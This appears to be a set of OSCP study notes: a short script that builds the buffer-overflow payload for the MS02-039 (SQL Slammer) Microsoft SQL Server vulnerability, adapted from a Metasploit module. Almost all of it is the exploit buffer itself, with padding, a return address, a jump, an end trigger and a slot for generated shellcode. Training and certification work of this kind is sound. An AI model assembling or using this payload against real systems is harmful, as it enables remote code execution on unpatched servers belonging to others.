# Use at your own risk with your own testing on your own systems
# this is for educational use during OSCP certification


# ms02_039 cliff notes
# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/mssql/ms02_039_slammer.rb
# add to msf exploit code to compare your bytes vs theirs: print_status(Rex::Text.to_hex(buf))
# bad_chars = "\x00\x3a\x0a\x0d\x2f\x5c"
ms02_039 = "\x04"
ms02_039 += "\x41" * 95  # 95 random bytes see buffer_fuzz.py for random bytes
ms02_039 += "\x74\x87\xb4\x42"  # return address little endian
ms02_039 += "\x4f\x9f\x96\x40\x37\xf8"  # 6 byte nop sled? taken straight from msf exploit
ms02_039 += "\xeb\x08"  # jump 8 bytes
ms02_039 += "\xcc\xe0\xfd\x7f\xcc\xe0\xfd\x7f"
ms02_039 += "<your shellcode>"  # your msfvenom generated shellcode, dont forget to math on next line
ms02_039 += "\x41" * 322  # length adjusted based on your shellcode length, final payload to be 806 bytes
ms02_039 += "\x68\x3a\x38\x38\x38"  # end trigger
         

